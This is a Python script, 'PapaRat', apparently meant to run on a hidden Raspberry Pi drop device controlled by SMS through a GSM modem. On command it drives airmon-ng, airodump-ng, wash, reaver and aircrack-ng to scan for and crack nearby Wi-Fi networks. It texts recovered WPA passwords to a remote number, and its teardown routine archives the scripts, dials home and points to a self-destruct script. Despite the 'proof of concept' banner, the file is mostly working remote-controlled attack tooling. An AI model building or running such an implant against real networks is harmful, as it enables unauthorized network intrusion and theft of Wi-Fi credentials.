"""
Copyright (C) 2017 Cosmin Ștefănică

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import serial
import time
import subprocess
import signal
import os
import binascii
import datetime

def print_license():
    print(  "PapaRat.py  Copyright (C) 2018 RatPack.inc\n"+
            "This program comes with ABSOLUTELY NO WARRANTY.\n"+
            "This is free software, and you are welcome to redistribute it\n"+
            "under certain conditions. This program's intended use is strictly\n"+
            "as a proof of concept and shall not be under any circumstances used\n"+
            "to cause any damage or harm to any third parties.\n"+
            "FOR TESTING PURPOSES ONLY!")

def test_serial_interface():
    return False

def log():
    return False

def bash_roulette():
    return False

def authenticate(sent_message=''):
    print 'authenticate started'
    return True

def chunks(text, length):
    #Produce `length`-character chunks from `text`.
    for start in range(0, len(text), length):
        yield text[start:start+length]

def deauth(interface='wlan1mon', channel='1'):
    print 'deauth started'
    return -1

def send_text(text, path='/dev/ttyUSB1'):
    number='insert your number here'
    print len(text)
    for chunk in chunks(text,130):
        ser = serial.Serial(path, baudrate=115200, dsrdtr=True, rtscts=True, timeout=1)
        # set text mode
        ser.write('AT+CMGF=%d\r' % 1)
        time.sleep(1)
        ser.readlines()
        # set encoding
        ser.write('AT+CSCS="GSM"\r')
        time.sleep(1)
        ser.readlines()
        # set number
        ser.write('AT+CMGS="%s"\r' % number)
        time.sleep(1)
        ser.readlines()
        # send message
        ser.write(chunk.encode("utf-8", "ignore"))
        ser.write('\x1a')
        escapeVariable = False
        line=ser.readlines()
        while escapeVariable is not True:
            print line
            for item in line:
                if "+CMGS: " in item:
                    escapeVariable = True
            line=ser.readlines()
        ser.close()
        time.sleep(1)
 
def receive_text(path='/dev/ttyUSB1'):
    # Start serial comms
    modem = serial.Serial(path, baudrate=115200, dsrdtr=True, rtscts=True, timeout=1)
    # Set text mode
    modem.write('AT+CMGF=1\r')
    # Request unread SMSes
    modem.write('AT+CMGL="REC UNREAD"\r')
    # Read output
    response = modem.readlines()
    # Close connection
    modem.close()
    print str(response).strip()
    if str(response[-3]).strip() != 'OK':
        return str(response[-3]).strip()
    else: 
        return 'CONTINUE'

def purge_texts(path='/dev/ttyUSB1'):
    # Start serial comms
    modem = serial.Serial(path, baudrate=115200, dsrdtr=True, rtscts=True, timeout=1)
    # Set text mode
    modem.write('AT+CMGF=1\r')
    # Delete all SMSes
    modem.write('AT+CMGD=0,3\r')
    # Ensure that unsent SMSes are purged, just to be sure.
    modem.write('\x1a')
    # Read output
    response = modem.readlines()
    # Close connection
    modem.close()
    print response

def parse_command(command=''):
    parsedCommand = str(command).split(' ')
    returnedCommand = { 'interface':'',
                        'bssid':'',
                        'timeout':'',
                        'channel':'',
                        'output_format':'',
                        'source_file':'',
                        'output_file':'',
                        'continue_reaver':False,
                        'wps_scan':False,
                        'verbose':False,
                        'monitor':False,
                        'open_networks':False}

    for item in parsedCommand:
        if item == '-i':
            index = parsedCommand.index(item)
            returnedCommand['interface'] = parsedCommand[index+1]
        elif item == '-b':
            index = parsedCommand.index(item)
            returnedCommand['bssid'] = parsedCommand[index+1]
        elif item == '-t':
            index = parsedCommand.index(item)
            returnedCommand['timeout'] = int(parsedCommand[index+1])
        elif item == '-c':
            index = parsedCommand.index(item)
            returnedCommand['channel'] = parsedCommand[index+1]
        elif item == '-f':
            index = parsedCommand.index(item)
            returnedCommand['output_format'] = parsedCommand[index+1]
        elif item == '-s':
            index = parsedCommand.index(item)
            returnedCommand['source_file'] = parsedCommand[index+1]
        elif item == '-o':
            index = parsedCommand.index(item)
            returnedCommand['output_file'] = parsedCommand[index+1]
        elif item == '-wps':
            returnedCommand['wps_scan'] = True
        elif item == '-vv':
            returnedCommand['verbose'] = True
        elif item == '-stop':
            returnedCommand['monitor'] = False
        elif item == '-start':
            returnedCommand['monitor'] = True
        elif item == '-cr':
            returnedCommand['continue_reaver'] = True
        elif item == '-open':
            returnedCommand['open_networks'] = True

    #print returnedCommand
    return returnedCommand

def process_dump(extension='.csv', source_file='AUTOwalker_Airodump'):
    filename = source_file + '-01' + extension
    dumpFile = open(filename,'r')

    splitLines = []
    lineDictionary = {'BSSID':'', 
    'First time seen':'', 
    'Last time seen':'', 
    'Channel':'', 
    'Speed':'', 
    'Privacy':'', 
    'Cypher':'', 
    'Auth':'', 
    'Power':'', 
    '#beacons':'', 
    '#IVS':'', 
    'lanIP':'', 
    'ID-Length':'', 
    'ESSID':'', 
    'key':''}

    # Read top two lines to move the cursor down
    dumpFile.readline()
    dumpFile.readline()

    for line in dumpFile:
        if str(line) in ['\n', '\r\n']:
            break
        singleLine = str(line).split(',')

        lineDictionary['BSSID'] = singleLine[0].strip()
        lineDictionary['First time seen'] = singleLine[1].strip()
        lineDictionary['Last time seen'] = singleLine[2].strip()
        lineDictionary['Channel'] = singleLine[3].strip()
        lineDictionary['Speed'] = singleLine[4].strip()
        lineDictionary['Privacy'] = singleLine[5].strip()
        lineDictionary['Cypher'] = singleLine[6].strip()
        lineDictionary['Auth'] = singleLine[7].strip()
        lineDictionary['Power'] = singleLine[8].strip()
        lineDictionary['#beacons'] = singleLine[9].strip()
        lineDictionary['#IVS'] = singleLine[10].strip()
        lineDictionary['lanIP'] = singleLine[11].strip()
        lineDictionary['ID-Length'] = singleLine[12].strip()
        lineDictionary['ESSID'] = singleLine[13].strip()
        lineDictionary['key'] = singleLine[14].strip()

        if lineDictionary['Power'] != '-1':
            splitLines.append(lineDictionary.copy())
    splitLines = sorted(splitLines, key=lambda k: k['Power'], reverse=False)
    dumpFile.close()
    return splitLines[:15]

def process_wash(airodumpFileOutput):
    source_file='AUTOwalker_wash'
    filename = source_file
    dumpFile = open(filename,'r')

    splitLines = []
    lineDictionary = {'BSSID':'', 
    'Channel':'', 
    'RSSI':'', 
    'WPS Version':'', 
    'Locked':'', 
    'ESSID':''}

    dumpFile.readline()
    dumpFile.readline()

    for line in dumpFile:
        if str(line) in ['\n', '\r\n']:
            break
        singleLine = str(line).split('      ')

        lineDictionary['BSSID'] = singleLine[0].strip()
        lineDictionary['Channel'] = singleLine[1].strip()
        lineDictionary['RSSI'] = singleLine[3].strip()
        lineDictionary['WPS Version'] = singleLine[4].strip()
        lineDictionary['Locked'] = singleLine[6].strip()
        lineDictionary['ESSID'] = singleLine[8].strip()

        if lineDictionary['Locked'] != 'Yes':
            splitLines.append(lineDictionary.copy())

    builtMessage = ''

    for dump_ID in airodumpFileOutput:
        for wash_ID in splitLines:
            if dump_ID['BSSID'] == wash_ID['BSSID']:
                builtMessage += dump_ID['ESSID']
                builtMessage += ' '
                builtMessage += dump_ID['BSSID']
                builtMessage += ' '
                builtMessage += dump_ID['Power']
                builtMessage += '|'

    dumpFile.close()
    return builtMessage

def process_reaver():
    source_file='AUTOwalker_reaver'
    dumpFile = open(source_file, 'r')

    for line in dumpFile:
        if 'WARNING: Detected AP rate limiting' in line:
            #'Limited rate, abort crack'
            dumpFile.close()
            return -1

        if 'seconds/pin' in line:
            print line
            processedLine = str(line).split(' ')[6]
            print processedLine
            processedLine = processedLine[1:]
            dumpFile.close()
            print processedLine
            return int(processedLine)

        if 'WPA PSK' in line:
            processedLine = str(line).split(':')
            #send_text(line)
            #Send it as a text message
            dumpFile.close()
            return -2

def process_crack(source_file=''):
    filename = source_file + ''
    dumpFile = open(filename, 'r')
    
    password = dumpFile.readline() #return this for message

    dumpFile.close()

    return password

def iwconfig(interface='wlan1'):
    print 'iwconfig started'
    process = subprocess.Popen(["sudo","iwconfig"], 
                    stdout=subprocess.PIPE, 
                    stdin=subprocess.PIPE, 
                    universal_newlines=True)
    (output, error) = process.communicate()

    if interface in str(output):
        return True
    else:
        return False

def airmon_ng(interface='wlan1', timeout=30, monitor=True):
    print 'airmon started'
    if monitor is True:
        process = subprocess.Popen(["sudo", "airmon-ng", "start", interface], 
                        stdout=subprocess.PIPE, 
                        stdin=subprocess.PIPE, 
                        universal_newlines=True)
    elif monitor is False:
        process = subprocess.Popen(["sudo", "airmon-ng", "stop", interface], 
                        stdout=subprocess.PIPE, 
                        stdin=subprocess.PIPE, 
                        universal_newlines=True)
    (output, error) = process.communicate()
    #print(output)
    return -1

def airodump_ng(interface='wlan1mon', channel='', output_file='AUTOwalker_Airodump', output_format = 'csv', timeout=1, open_flag = False):
    
    print('airodump started on '+interface)

    os.system('sudo mv AUTOwalker_Airodump-01.'+output_format+' Dumps/Airodump_'+str(datetime.datetime.now()).replace(" ","")+'.'+output_format)
    time.sleep(5)
    parameterList = ['sudo', 'airodump-ng', interface]

    if channel != '':
        parameterList.append('-c')
        parameterList.append(channel)

    if open_flag:
        parameterList.append('--encrypt')
        parameterList.append('OPN')

    parameterList.append('--write')
    parameterList.append(output_file)
    parameterList.append('--output-format')
    parameterList.append(output_format)
    parameterList.append('--wps')
    parameterList.append('--ignore-negative-one')

    print parameterList
    process = subprocess.Popen(parameterList, 
                    stdout=subprocess.PIPE, 
                    stdin=subprocess.PIPE, 
                    universal_newlines=True)
    time.sleep(timeout)
    os.system('sudo killall airodump-ng')
    return -1

def aircrack_ng(bssid='', output_file='', source_file='', timeout=30):
    parameterList = ['sudo', 'aircrack-ng']

    if bssid != '':
        parameterList.append('-b')
        parameterList.append(bssid)

    if output_file != '':
        parameterList.append('-l')
        parameterList.append(output_file)

    if source_file != '':
        parameterList.append(source_file)
    else:
        return False

    print 'aircrack started'
    print parameterList

    process = subprocess.Popen(parameterList, 
                stdout=subprocess.PIPE, 
                stdin=subprocess.PIPE, 
                universal_newlines=True)

    process.wait()

    return True

def wash(interface='wlan1mon', timeout=30):

    if interface == '':
        return False

    print 'wash started'
    output_file = 'AUTOwalker_wash'
    process = subprocess.Popen(['sudo', 
        'wash',
        '-i', interface,
        '-o', output_file, 
        '-C'], 
                    stdout=subprocess.PIPE, 
                    stdin=subprocess.PIPE, 
                    universal_newlines=True)
    time.sleep(int(timeout))
    os.system('sudo killall wash')
    return True

def reaver(interface='wlan1mon', bssid='', timeout=30, continue_crack=False): 

    if bssid == '':
        return False
    if interface == '':
        return False

    print 'reaver started'

    sessionFileName = '/usr/local/etc/reaver/' + bssid.replace(':','') + '.wpc'
    os.system('rm AUTOwalker_reaver')

    if continue_crack == True:
        process = subprocess.Popen(['sudo', 
            'reaver',
            '-i', interface,
            '-b', bssid, 
            '-s', sessionFileName,
            '-o', 'AUTOwalker_reaver'], 
                        stdout=subprocess.PIPE, 
                        stdin=subprocess.PIPE, 
                        universal_newlines=True)
    elif continue_crack == False:
        os.system('rm '+sessionFileName)
        process = subprocess.Popen(['sudo', 
            'reaver',
            '-i', interface,
            '-b', bssid, 
            '-vv',
            '-o', 'AUTOwalker_reaver'], 
                        stdout=subprocess.PIPE, 
                        stdin=subprocess.PIPE, 
                        universal_newlines=True)

    time.sleep(timeout/2)
    process_reaver() #optimize this, pass the file handler along, to only read where you left off.
    time.sleep(timeout/2)
    returnCode = process_reaver()

    if returnCode == -1:
        process.send_signal(signal.SIGINT)
        print('limited')
        send_text('ABORTED: Rate Limited for '+bssid)
        #return -1
        #Send a text message that the AP is limited, crack is not viable
    elif returnCode >= 10:
        process.send_signal(signal.SIGINT)
        print('takestoolong')
        send_text('ABORTED: Takes too long on '+bssid)
        #return -11
        #Send a text message that the pins take a long time. Continuation of crack is possible.
    elif returnCode == -2:
        process.send_signal(signal.SIGINT)
        print('itworks')
    return True

def teardown_rat():
    print 'Calling home and tearing down!'
    wvdialConfig = 'call_home'
    wvdialNetworkConfig = 'network'
    callHome = ['sudo', 'screen', '-d', '-m', '-t', wvdialConfig, 'wvdial', wvdialNetworkConfig]
    createTarball = ['sudo', 'tar', '-czf', '/home/pi/PapaRat_drop.tar.gz','/home/pi/Python_scripts/']

    process = subprocess.Popen( createTarball,
                                stdout=subprocess.PIPE, 
                                stdin=subprocess.PIPE, 
                                universal_newlines=True)
    process.wait()

    process = subprocess.Popen( callHome,
                                stdout=subprocess.PIPE, 
                                stdin=subprocess.PIPE, 
                                universal_newlines=True)
    process.wait()

def self_destruct():
    runBashRoulette = ['sudo', 'sh', 'bashRoulette.sh']
    """
    process = subprocess.Popen( runBashRoulette,
                                stdout=subprocess.PIPE, 
                                stdin=subprocess.PIPE, 
                                universal_newlines=True)
    process.wait()
    """

def control_loop():
    while(1):
        try:
            received_text = receive_text()
        except IndexError:
            print "Serial communication error, retrying in 10"
            received_text='CONTINUE'
        #print received_text
        if 'exit' in received_text:
            purge_texts()
            break

        elif 'authenticate' in received_text:
            authenticate(received_text)

        elif 'iwconfig' in received_text:
            argumentsDict = parse_command(received_text)
            status = iwconfig(interface = argumentsDict['interface'])
            if status == True:
                send_text(argumentsDict['interface']+' is available!')
                purge_texts()
            else:
                send_text(argumentsDict['interface']+' is not available!')
                purge_texts()

        elif 'airmon' in received_text:
            argumentsDict = parse_command(received_text)
            if iwconfig(interface = argumentsDict['interface']) is True:
                time.sleep(1)
                airmon_ng(  interface = argumentsDict['interface'],
                            monitor = argumentsDict['monitor'])

                if argumentsDict['monitor'] is True:
                    if iwconfig(interface = argumentsDict['interface']+'mon') is True:
                        send_text('Monitor mode active on '+argumentsDict['interface']+'mon')
                    else:
                        send_text('Something went wrong activating monitor on '+argumentsDict['interface']+'! Try again!')
                else:
                    if  iwconfig(interface = argumentsDict['interface']) is True:
                        send_text('Monitor mode deactivated for '+argumentsDict['interface'])
                    else:
                        send_text('Something went wrong deactivating monitor on '+argumentsDict['interface']+'! Try again!')

        elif 'airodump' in received_text:
            argumentsDict = parse_command(received_text)
            AccesPointList = []
            APString = ""
            if iwconfig(interface = argumentsDict['interface']) is True:
                airodump_ng(interface = argumentsDict['interface'], 
                            timeout = argumentsDict['timeout'], 
                            open_flag = argumentsDict['open_networks'])
                time.sleep(1)
                AccesPointList = process_dump()
            for item in AccesPointList[:5]:
                APString += str(item['ESSID'])
                APString += ' '
                APString += str(item['BSSID'])
                APString += ' '
                APString += str(item['Channel'])
                APString += '\n'
            #print(APString)
            send_text(APString)

        elif 'aircrack' in received_text:
            argumentsDict = parse_command(received_text)
            aircrack_ng(bssid = argumentsDict['bssid'],
                        source_file = argumentsDict['source_file'],
                        output_file = argumentsDict['output_file'])
            
            password = process_crack(argumentsDict['output_file'])
            send_text(password)

        elif 'wash' in received_text:
            argumentsDict = parse_command(received_text)
            wash(interface = argumentsDict['interface'], timeout = argumentsDict['timeout'])
            airodump_ng(interface = argumentsDict['interface'], timeout = argumentsDict['timeout'])
            time.sleep(1)
            dumpList = process_dump()
            message = process_wash(airodumpFileOutput = dumpList)
            #print(message)
            send_text(message)

        elif 'reaver' in received_text:
            argumentsDict = parse_command(received_text)
            reaver( interface = argumentsDict['interface'],
                    timeout = argumentsDict['timeout'],
                    continue_crack = argumentsDict['continue_reaver'])

        elif 'deauth' in received_text:
            argumentsDict = parse_command(received_text)
            deauth()

        elif 'teardown' in received_text:
            argumentsDict = parse_command(received_text)
            teardown_rat()
            send_text("May the odds be ever in your favor!")
            purge_texts()
            self_destruct()
            break

        purge_texts()
        time.sleep(10)
    return -1

def main():
    os.chdir("/home/pi/Python_scripts/")
    print_license()
    time.sleep(10)
    send_text("PapaRat woke up!")
    control_loop()
    #airodump_ng()

if __name__ == "__main__":
    main()
